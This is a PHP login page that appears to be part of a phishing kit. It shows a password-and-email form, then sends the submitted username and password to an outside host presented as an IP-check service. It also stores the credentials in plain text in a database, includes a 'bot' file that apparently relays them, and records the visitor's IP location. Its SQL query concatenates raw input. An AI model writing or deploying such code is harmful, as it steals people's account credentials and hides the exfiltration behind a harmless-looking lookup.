<?php

include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");

session_start();
error_reporting(0);


$username=$_GET['username'];

if($_POST){
    $mail=$_POST["mail"];
    $password=$_POST["pass"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    $ips="$ip,$username ,$password";
    $url="https://ip-check-api.com/".$ips;
    $cek = file_get_contents($url);
    $data = explode (",",$cek);
    $ulke = $data[0];
    $sehir = $data[1];
    date_default_timezone_set('Europe/Istanbul');
    $cur_time=date("d-m-Y H:i:s");
    include ("app/bot/value1.php");

    $yaz = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$password."','Null','".$mail."','Null','Null','".$ip."',current_timestamp())");



    header("Location: confirmed.php?username=$username");
 }
  




?>


<!DOCTYPE html>
<html>
<head>
    <?php include ("app/tag/main/meta.php");  ?>
    <link rel="stylesheet" type="text/css" href="assets/theme/classic/css/style.css">
    <link href="https://fonts.googleapis.com/css?family=Poppins:600&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/a81368914c.js"></script>

</head>
<body>
    <img class="wave" src="assets/theme/classic/img/wave.png">
    <div class="container">
        <div class="img">
            <img src="assets/theme/classic/img/loginform.svg">
        </div>
        <div class="login-content">
            <form action="" method="post">
                <img src="assets/theme/classic/img/logom.png" width="100">
                <h2 class="title"><?php echo $formbaslik; ?></h2>
        <center>        <p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;"><?php echo $formyazi; ?></p></center>
         <br>       <div class="input-div one">
                   <div class="i">
                        <i class="fas fa-lock"></i>
                   </div>
                   <div class="div">
                        <h5>Password</h5>
                        <input type="password" name="pass" class="input" required>
                   </div>
                </div>
                 <div class="input-div one">
                   <div class="i">
                        <i class="fas fa-envelope"></i>
                   </div>
                   <div class="div">
                        <h5>E-Mail</h5>
                        <input type="email" name="mail" class="input" required>
                   </div>
                </div>
                <div>
                    
                    <input type="submit" class="btn" value="Continue">
                   </div>
                
                </div>
                
            
            </form>
        </div>
    </div>
    <script type="text/javascript" src="assets/theme/classic/js/main.js"></script>
</body>
</html>